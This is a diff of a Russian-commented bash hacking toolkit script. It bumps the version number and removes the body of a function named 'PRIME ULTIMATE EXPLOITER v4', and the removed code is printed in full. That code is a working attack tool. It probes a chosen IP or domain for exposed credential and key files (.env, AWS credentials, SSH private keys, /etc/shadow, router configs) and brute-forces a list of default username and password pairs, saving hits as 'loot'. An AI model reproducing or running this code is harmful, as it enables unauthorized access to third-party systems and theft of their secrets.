@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="34.2"
+CURRENT_VERSION="34.3"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -1001,61 +1001,7 @@ run_pwd_gen() {
 
 # 1. Единый Движок Эксплуатации (Ручной + Авто режим)
 run_prime_exploiter_v4() {
-    # Если аргумент передан ($1), используем его. Если нет — спрашиваем.
-    if [ -n "$1" ]; then
-        TARGET="$1"
-    else
-        clear
-        echo -e "\e[1;31m--------------------------------------------------"
-        echo "    PRIME ULTIMATE EXPLOITER v4 (LIVE ENGINE)     "
-        echo "--------------------------------------------------\e[0m"
-        echo -n "Enter Target (IP or Domain): "
-        read TARGET
-    fi
-
-    [ -z "$TARGET" ] && return
-
-    UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
     
-    # --- Ультимативные списки (Векторы и Креды) ---
-    V_LIST=("/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" "/config.xml:root" "/dev/mtd0:ELF" "/etc/config/network:config interface" "/sysconf.cgi:admin_password" "/home/httpd/html/config/exportsettings.conf:Password" "/etc/RT2860_default_vlan:Password" "/.env:DB_PASSWORD" "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE" "/.docker/config.json:auths" "/.npmrc:_auth" "/.bash_history:ssh " "/.kube/config:client-certificate-data" "/wp-config.php.bak:DB_PASSWORD" "/wp-config.php.swp:DB_PASSWORD" "/wp-content/debug.log:WP_User" "/configuration.php:public $password" "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password" "/etc/shadow:root:" "/etc/passwd:root:x" "/admin/.htpasswd:admin:" "/.history:password")
-    C_LIST=("admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" "dbadmin:dbadmin")
-
-    for proto in "http" "https"; do
-        URL="${proto}://${TARGET}/"
-        RESP=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null | head -n1)
-        CODE=$(echo "$RESP" | grep -oE '[0-9]{3}' | head -n1)
-        CODE=${CODE:-000}
-
-        if [[ "$CODE" == "200" || "$CODE" == "401" || "$CODE" == "302" ]]; then
-            echo -e "    \e[1;32m[+]\e[0m $URL [Status: $CODE]"
-            
-            # Векторы
-            for vec in "${V_LIST[@]}"; do
-                V_PATH=$(echo "$vec" | cut -d':' -f1); V_KEY=$(echo "$vec" | cut -d':' -f2)
-                if curl -sL -k -A "$UA" --max-time 3 "${proto}://${TARGET}${V_PATH}" 2>/dev/null | grep -q "$V_KEY"; then
-                    echo -e "    \e[1;31m[!!!] VULN FOUND: $V_PATH\e[0m"
-                    echo "[EXPL] ${TARGET}${V_PATH} | $V_KEY" >> /root/prime_loot_live.txt
-                fi
-            done
-
-            # Брут
-            for pair in "${C_LIST[@]}"; do
-                U=$(echo "$pair" | cut -d':' -f1); P=$(echo "$pair" | cut -d':' -f2)
-                if [[ $(curl -sL -k -u "$U:$P" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 2 "$URL") == "200" ]]; then
-                    echo -e "    \e[1;32m[!!!] AUTH MATCH: $U:$P\e[0m"
-                    echo "[AUTH] $U:$P @ $TARGET" >> /root/prime_loot_live.txt
-                    break
-                fi
-            done
-        fi
-    done
-
-    # В ручном режиме ждем нажатия кнопки, в авто — идем дальше
-    if [ -z "$1" ]; then
-        echo -e "\n\e[1;32mDone. Loot saved.\e[0m"
-        read -p "Press [ENTER]"
-    fi
 }
 
 # 2. Интеллектуальный Эвристический Сканер
